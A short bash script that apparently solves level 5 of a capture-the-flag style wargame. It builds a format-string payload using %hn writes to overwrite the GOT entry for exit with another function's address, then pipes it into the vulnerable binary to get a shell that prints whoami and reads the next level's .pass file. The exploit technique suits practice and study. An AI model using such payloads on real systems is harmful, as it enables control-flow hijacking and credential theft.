#!/bin/bash

GETPASS="cat /home/user/level6/.pass"

set -x

WRITE_ADDRESS_1="\x3a\x98\x04\x08" # exit address: 0x08049838 + 2
PADDING_1="%2044x"            # o address: 0x080484a4 & 0xffff = 0x0804 - 8 = 0x7fc (2044) => prints 0x0804 
WRITE_MODIFIER_1='%4$hn'

WRITE_ADDRESS_2="\x38\x98\x04\x08" # exit address: 0x08049838
PADDING_2="%31904x"            # o address: 0x080484a4 & 0x0000fffff = 0x84a4 - 0x0804 = 0x7ca0 (31904)
WRITE_MODIFIER_2='%5$hn'

WRITE_ADDRESS="${WRITE_ADDRESS_1}${WRITE_ADDRESS_2}"
PADDING="${PADDING_1}${PADDING_2}"
WRITE_MODIFIER="${WRITE_MODIFIER_1}${WRITE_MODIFIER_2}"

python -c "print('$WRITE_ADDRESS' + '$PADDING' + '$WRITE_MODIFIER')" > /tmp/exploit5

(cat /tmp/exploit5 - | ~/level5) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI